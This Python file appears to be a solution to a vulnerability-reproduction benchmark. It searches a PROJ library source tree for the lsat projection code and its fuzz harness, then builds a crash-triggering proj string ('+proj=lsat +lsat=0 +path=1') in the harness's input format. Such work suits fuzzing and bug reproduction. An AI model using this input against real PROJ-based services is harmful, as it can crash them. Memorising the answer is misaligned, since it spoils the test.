import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_text_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                low = name.lower()
                if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = data.decode("latin1", "ignore")
                yield name, txt

    def _iter_text_files_from_dir(self, root: str) -> Iterable[Tuple[str, str]]:
        for base, _, files in os.walk(root):
            for fn in files:
                low = fn.lower()
                if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".cxx") or low.endswith(".h") or low.endswith(".hpp")):
                    continue
                path = os.path.join(base, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = data.decode("latin1", "ignore")
                yield path, txt

    def _get_text_iter(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            return self._iter_text_files_from_dir(src_path)
        return self._iter_text_files_from_tar(src_path)

    def _extract_lsat_info(self, src_path: str) -> Tuple[str, str, str]:
        proj_name = "lsat"
        lsat_key = "lsat"
        path_key = "path"

        best_txt = None
        best_name = None

        it = self._get_text_iter(src_path)
        for name, txt in it:
            base = os.path.basename(name).lower()
            if base == "pj_lsat.c" or base.endswith("/pj_lsat.c"):
                best_txt = txt
                best_name = name
                break
            if "pj_lsat.c" in name.lower():
                best_txt = txt
                best_name = name

        if not best_txt:
            return proj_name, lsat_key, path_key

        txt = best_txt

        m = re.search(r"PROJ_HEAD\s*\(\s*([A-Za-z0-9_]+)\s*,", txt)
        if not m:
            m = re.search(r"PROJECTION\s*\(\s*([A-Za-z0-9_]+)\s*\)", txt)
        if m:
            proj_name = m.group(1)

        keys = re.findall(r'pj_param\s*\([^;]*"i([A-Za-z0-9_]+)"', txt)
        keyset = set(k.lower() for k in keys)
        if "lsat" in keyset:
            lsat_key = "lsat"
        if "path" in keyset:
            path_key = "path"

        return proj_name, lsat_key, path_key

    def _detect_mode(self, src_path: str) -> str:
        mode = "single"
        best = {"half": 3, "nul": 2, "newline": 1, "fdp_remaining": 2, "fdp": 0, "single": 0}

        def update(new_mode: str):
            nonlocal mode
            if best.get(new_mode, 0) > best.get(mode, 0):
                mode = new_mode

        for name, txt in self._get_text_iter(src_path):
            if "LLVMFuzzerTestOneInput" not in txt and "fuzzer" not in name.lower():
                continue

            if "FuzzedDataProvider" in txt:
                if "ConsumeRemainingBytesAsString" in txt:
                    update("fdp_remaining")
                else:
                    update("fdp")

            if re.search(r"\bSize\s*/\s*2\b", txt) and ("Data" in txt or "data" in txt):
                if "Data + Size / 2" in txt or "Data+Size/2" in txt or "data + size / 2" in txt or "data+size/2" in txt:
                    update("half")

            if "memchr" in txt and ("\\0" in txt or "'\\0'" in txt or "\"\\0\"" in txt):
                update("nul")
            if "find('\\0')" in txt or "find(\"\\0\")" in txt or "strchr" in txt and ("'\\0'" in txt or "\"\\0\"" in txt):
                update("nul")

            if "find('\\n')" in txt or "find(\"\\n\")" in txt or ("memchr" in txt and ("'\\n'" in txt or "\"\\n\"" in txt)):
                update("newline")

            if mode == "half":
                break

        return mode

    def _pack_u64_le(self, v: int) -> bytes:
        v &= (1 << 64) - 1
        return bytes((v >> (8 * i)) & 0xFF for i in range(8))

    def solve(self, src_path: str) -> bytes:
        proj_name, lsat_key, path_key = self._extract_lsat_info(src_path)

        mal = f"+proj={proj_name} +{lsat_key}=0 +{path_key}=1 +R=1"
        valid = "+proj=longlat +R=1"

        mode = self._detect_mode(src_path)

        if mode == "half":
            m = max(len(mal), len(valid))
            a = mal.ljust(m)
            b = valid.ljust(m)
            return (a + b).encode("ascii", "ignore")

        if mode == "nul":
            return (mal + "\0" + valid).encode("ascii", "ignore")

        if mode == "newline":
            return (mal + "\n" + valid).encode("ascii", "ignore")

        if mode == "fdp_remaining":
            return mal.encode("ascii", "ignore")

        if mode == "fdp":
            # Best-effort for common patterns: two ConsumeRandomLengthString calls first.
            b = bytearray()
            b += self._pack_u64_le(len(mal))
            b += mal.encode("ascii", "ignore")
            b += self._pack_u64_le(len(valid))
            b += valid.encode("ascii", "ignore")
            b += b"\x00" * 64
            return bytes(b)

        return mal.encode("ascii", "ignore")